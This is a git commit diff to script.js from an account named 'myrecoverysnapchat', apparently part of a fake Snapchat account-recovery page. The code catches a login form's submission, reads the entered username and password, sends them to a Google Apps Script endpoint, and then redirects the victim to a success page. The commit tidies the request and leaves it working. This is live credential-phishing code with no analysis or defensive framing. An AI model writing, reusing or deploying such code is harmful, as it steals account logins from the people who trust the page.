94fd85aa7db44bdc11befcf729fd066955f91e4b
myrecoverysnapchat <myrecovery.snapchat@gmail.com>
2026-05-11 11:33:52 +0700

    Update script.js

--- script.js
+++ script.js
@@ -1,6 +1,6 @@
 document
   .getElementById("loginForm")
-  .addEventListener("submit", async function(e){
+  .addEventListener("submit", function(e){
 
     e.preventDefault();
 
@@ -10,21 +10,14 @@ document
     const password =
       document.getElementById("password").value;
 
-    console.log("Sending to Sheets...");
-
     fetch("https://script.google.com/macros/s/AKfycbxQOEthGEkGLiq_ZBxC4UXveK31Oe8bqZ_dN3e-fyC0QXQkjOE80vMu6Jb6fzVMNic/exec", {
-  method: "POST",
-  mode: "no-cors",
-  headers: {
-    "Content-Type": "application/x-www-form-urlencoded"
-  },
-  body: new URLSearchParams({
-    username,
-    password
-  })
-});
+      method: "POST",
+      mode: "no-cors",
+      body: new URLSearchParams({
+        username,
+        password
+      })
+    });
 
     window.location.href = "success.html";
 });
-
-
